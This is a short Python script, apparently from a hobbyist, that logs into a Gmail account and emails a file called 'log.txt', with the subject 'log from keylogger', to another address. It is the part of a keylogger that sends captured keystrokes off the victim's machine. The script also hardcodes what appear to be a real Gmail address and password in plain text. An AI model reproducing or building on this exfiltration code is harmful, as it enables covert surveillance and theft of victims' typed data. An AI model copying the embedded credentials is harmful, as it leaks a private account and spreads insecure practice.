#-------------------------------------------------------------------------------
# Name:        module1
# Purpose:
#
# Author:      tsilivisn
#
# Created:     28/01/2014
# Copyright:   (c) tsilivisn 2014
# Licence:     <your licence>
#-------------------------------------------------------------------------------
from pygmail import pygmail
from time import gmtime, strftime

g = pygmail()
g.login('nick.tsilivis@gmail.com', 'notorious3')
##
##print g.response
##
##g.get_mailboxes()
##for item in g.mailboxes:
##    print item
##
##print(g.get_mail_count())
##
##print(g.get_unread_count("INBOX"))
##
##id_list = g.get_mails_from("tsilivism")
##
##for mail in id_list:
##    print(g.get_mail_from_id(mail))
##
##g.logout()
##
##g.send_email("nick.tsilivis@gmail.com", "p.tsilivis10@gmail.com", "Automatic python email " + strftime("%Y-%m-%d %H:%M:%S", gmtime()), "This is an automatic email sent from python program")

g.send_email_with_attachmen("nick.tsilivis@gmail.com", "moustant21@gmail.com", "log from keylogger", "C:\\Users\\nick\\Pictures\\test\\", "log.txt")
